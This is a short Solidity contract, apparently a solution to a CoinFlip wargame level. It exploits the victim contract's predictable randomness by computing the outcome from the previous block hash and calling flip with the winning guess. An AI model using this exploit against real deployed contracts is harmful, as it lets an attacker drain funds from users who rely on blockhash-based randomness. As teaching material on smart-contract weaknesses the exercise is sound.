// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coinflip.sol";

contract N3Attacker {
    CoinFlip victim;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victim) {
        victim = CoinFlip(_victim);
    }

    function flipForWin() public {
        uint lastBlockHash = uint256(blockhash(block.number - 1));
        lastBlockHash / FACTOR == 1 ? victim.flip(true) : victim.flip(false);
    }
}